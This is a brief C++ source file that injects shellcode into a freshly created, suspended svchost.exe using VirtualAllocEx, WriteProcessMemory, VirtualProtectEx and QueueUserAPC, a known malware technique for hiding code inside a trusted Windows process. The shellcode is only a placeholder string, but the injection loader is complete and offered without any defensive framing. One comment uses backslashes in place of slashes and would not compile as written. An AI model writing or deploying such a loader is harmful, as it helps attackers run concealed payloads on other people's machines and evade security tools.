#include <windows.h>
#include <iostream>
#include <string>
#include <wininet.h>

int main() {
	unsigned char buf[] = "shell-code"; 
	SIZE_T payload_size = sizeof(buf); 
	STARTUPINFOA startprocess = { 0 }; 
	PROCESS_INFORMATION processinfo = { 0 }; 
	PVOID remotebuffer = 0; 
	DWORD oldprotection = NULL; 
	char newproc[] = "C:\\Windows\\System32\\svchost.exe";                                                       \\ process to inject into
	CreateProcessA(newproc, NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &startprocess, &processinfo); 
	HANDLE hprocess = processinfo.hProcess; HANDLE hthread = processinfo.hThread; 
	remotebuffer = VirtualAllocEx(hprocess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	LPTHREAD_START_ROUTINE apcroutine = (LPTHREAD_START_ROUTINE)remotebuffer; 
	WriteProcessMemory(hprocess, remotebuffer, buf, payload_size, NULL); 
	VirtualProtectEx(hprocess, remotebuffer, payload_size, PAGE_EXECUTE_READ, &oldprotection); 
	QueueUserAPC((PAPCFUNC)apcroutine, hthread, NULL); 
	ResumeThread(hthread); return 0; 
}
